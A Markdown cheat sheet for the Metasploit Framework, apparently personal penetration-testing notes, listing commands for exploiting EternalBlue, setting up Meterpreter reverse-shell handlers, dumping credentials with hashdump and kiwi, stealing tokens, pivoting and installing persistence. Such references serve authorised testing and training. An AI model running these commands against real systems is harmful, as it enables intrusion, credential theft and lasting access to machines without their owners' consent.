# Metasploit Framework

**Tags:** `#metasploit` `#msfconsole` `#payloads` `#shells` `#postexploit`

Open-source exploitation framework with modules for exploitation, post-exploitation, pivoting, and payload generation. Uses PostgreSQL to track hosts, services, creds, and loot across an engagement.

**Source:** https://github.com/rapid7/metasploit-framework
**Install:** Pre-installed on Kali

```bash
msfconsole -q
```

> [!note]
> Staged payloads (`windows/x64/meterpreter/reverse_tcp`) require a running `multi/handler`. Stageless (`_reverse_tcp`) can connect to a plain netcat listener. Meterpreter runs in memory via DLL injection — no disk writes by default.

---

## Database Setup

```bash
sudo msfdb init
sudo msfdb status

# Reinit if broken
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

---

## Workspaces

```bash
workspace               # show current
workspace -a pentest1   # create + switch
workspace pentest1      # switch to existing
workspace -d pentest1   # delete
```

---

## Database Commands

```bash
hosts                           # discovered hosts
services                        # discovered services
creds                           # stored credentials
loot                            # collected loot

db_import nmapscan.xml          # import nmap XML
db_nmap -sV -p- -T4 10.10.10.15  # run nmap + store results
db_export -f xml backup.xml     # export DB
```

---

## Searching

```bash
search cve:2021 type:exploit platform:windows rank:excellent microsoft
search type:exploit platform:linux
search eternalblue
search type:auxiliary name:smb

# Grep payloads
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads
grep -c meterpreter show payloads       # count matches
```

---

## Module Workflow

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
show payloads
show targets
show info

set RHOSTS 10.10.10.40
set LHOST 10.10.14.5
set LPORT 4444
setg RHOSTS 10.10.10.40         # set globally across modules
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set target 0

run -j          # background job
exploit         # foreground (alias for run)
```

---

## Sessions & Jobs

```bash
sessions                    # list
sessions -i 1               # interact
sessions -u 1               # upgrade shell → meterpreter
sessions -k 1               # kill
sessions -K                 # kill all

jobs -l                     # list jobs
jobs -k 1                   # kill job
```

---

## Meterpreter

```bash
# System info
sysinfo
getuid
getpid
ps

# Filesystem
pwd; ls; cd C:\\Users
upload /local/file.exe C:\\Windows\\Temp\\file.exe
download C:\\path\\file.txt /local/

# Privilege
getsystem               # auto privesc attempt
getprivs                # list privileges
steal_token 1836        # impersonate token from PID

# Credential dumping
hashdump                # SAM hashes
load kiwi
creds_all               # dump everything via kiwi
lsa_dump_sam
lsa_dump_secrets

# Pivoting
portfwd add -l 3389 -p 3389 -r 172.16.5.10
route add 172.16.5.0/24 1   # route subnet through session 1

# Shell
shell                   # OS shell
Ctrl+Z                  # background back to meterpreter
```

---

## Post-Exploitation Modules

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/manage/persistence_exe
```

---

## Handlers

```bash
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
run -j
```

One-liner:
```bash
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; set ExitOnSession false; run -j"
```

---

## Custom Module Installation

```bash
# Drop .rb file matching folder structure
cp module.rb /usr/share/metasploit-framework/modules/exploits/linux/http/mymodule.rb

# Reload inside msfconsole
reload_all
```

Naming: snake_case `.rb`. Match structure: `exploits/`, `auxiliary/`, `post/`, `payloads/`.

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
